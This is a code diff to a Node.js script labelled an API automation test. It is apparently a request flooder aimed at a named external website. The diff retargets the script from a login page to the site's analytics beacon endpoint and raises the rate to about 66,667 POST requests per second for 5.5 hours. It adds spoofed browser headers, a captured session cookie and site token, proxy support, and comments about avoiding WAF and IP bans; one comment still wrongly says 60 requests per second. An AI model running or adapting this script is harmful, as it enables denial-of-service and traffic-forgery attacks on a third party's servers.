@@ -6,9 +6,9 @@ import http from 'http';
 import { HttpsProxyAgent } from 'https-proxy-agent';
 
 // Configurable constants
-const TARGET_URL = process.env.TARGET_URL || 'https://2.52gs.co/chklogin.php';
+const TARGET_URL = process.env.TARGET_URL || 'https://2.52gs.co/cdn-cgi/rum?';
 const TEST_DURATION_MINUTES = parseInt(process.env.TEST_DURATION_MINUTES) || 330; // 5.5 hours (leaves 30 min buffer for GitHub's 6-hour limit)
-const TARGET_RPS = parseInt(process.env.TARGET_RPS) || 60; // Limit to 60 requests per second to avoid HTTP 429 WAF bans
+const TARGET_RPS = parseInt(process.env.TARGET_RPS) || 66667; // Limit to 60 requests per second to avoid HTTP 429 WAF bans
 const CONCURRENCY_LIMIT = parseInt(process.env.CONCURRENCY_LIMIT) || 1000; // Conservative to avoid IP bans
 const REQUEST_TIMEOUT_MS = parseInt(process.env.REQUEST_TIMEOUT_MS) || 5000; // 10 seconds timeout per call
 const PROXY_URL = process.env.PROXY_URL || ''; // Optional: proxy URL (e.g. http://user:pass@host:port)
@@ -17,7 +17,7 @@ async function runAutomation() {
   const testDurationMs = TEST_DURATION_MINUTES * 60 * 1000;
   const endTime = Date.now() + testDurationMs;
 
-  console.log(`Starting GET API Automation Test`);
+  console.log(`Starting POST API Automation Test`);
   console.log(`Target URL:        ${TARGET_URL}`);
   console.log(`Test Duration:     ${TEST_DURATION_MINUTES} minutes (${(TEST_DURATION_MINUTES / 60).toFixed(1)} hours)`);
   console.log(`Target RPS:        ${TARGET_RPS > 0 ? TARGET_RPS : 'Unlimited'}`);
@@ -58,15 +58,71 @@ async function runAutomation() {
     });
   }
 
+  const payload = JSON.stringify({
+    "memory": {
+      "totalJSHeapSize": 25712678,
+      "usedJSHeapSize": 19490026,
+      "jsHeapSizeLimit": 4395630592
+    },
+    "resources": [],
+    "referrer": "",
+    "eventType": 1,
+    "firstPaint": 180,
+    "firstContentfulPaint": 180,
+    "startTime": 1783784910878.4,
+    "versions": {
+      "fl": "2024.11.0",
+      "js": "2026.6.0",
+      "timings": 2
+    },
+    "pageloadId": "0d47351c-2745-4ac1-8ca9-ce673a64ed29",
+    "location": "https://2.52gs.co/",
+    "nt": "reload",
+    "timingsV2": {
+      "nextHopProtocol": "h3",
+      "domainLookupStart": 0.6000000089406967,
+      "domainLookupEnd": 0.6000000089406967,
+      "connectStart": 0.6000000089406967,
+      "connectEnd": 0.6000000089406967,
+      "requestStart": 1.6000000089406967,
+      "responseStart": 30.700000002980232,
+      "responseEnd": 33.20000000298023,
+      "domInteractive": 378.6000000089407,
+      "domComplete": 807.2000000029802,
+      "loadEventStart": 807.2000000029802,
+      "loadEventEnd": 807.9000000059605,
+      "finalResponseHeadersStart": 30.700000002980232,
+      "firstInterimResponseStart": 0,
+      "transferSize": 5835,
+      "decodedBodySize": 15471
+    },
+    "dt": "",
+    "siteToken": "0598640d96264f90b5f25bb535c5eec3",
+    "st": 2
+  });
+
   const options = {
     hostname: parsedUrl.hostname,
     port: parsedUrl.port || (isHttps ? 443 : 80),
     path: parsedUrl.pathname + parsedUrl.search,
-    method: 'GET',
+    method: 'POST',
     agent: agent,
     headers: {
-      'User-Agent': 'AutomationTest/1.0',
-      'Accept': 'application/json, text/plain, */*'
+      'accept': '*/*',
+      'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
+      'content-type': 'application/json',
+      'cookie': 'PHPSESSID=up4ksdqgf06efh284o2log3g2q',
+      'origin': 'https://2.52gs.co',
+      'priority': 'u=1, i',
+      'referer': 'https://2.52gs.co/',
+      'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
+      'sec-ch-ua-mobile': '?0',
+      'sec-ch-ua-platform': '"Windows"',
+      'sec-fetch-dest': 'empty',
+      'sec-fetch-mode': 'cors',
+      'sec-fetch-site': 'same-origin',
+      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36',
+      'content-length': Buffer.byteLength(payload)
     }
   };
 
@@ -108,7 +164,7 @@ async function runAutomation() {
     }
   }
 
-  // Dispatch a single HTTP GET request
+  // Dispatch a single HTTP POST request
   function dispatchRequest() {
     return new Promise((resolve) => {
       const requestStartTime = Date.now();
@@ -167,7 +223,7 @@ async function runAutomation() {
         resolve();
       });
 
-      req.end();
+      req.end(payload);
     });
   }
 
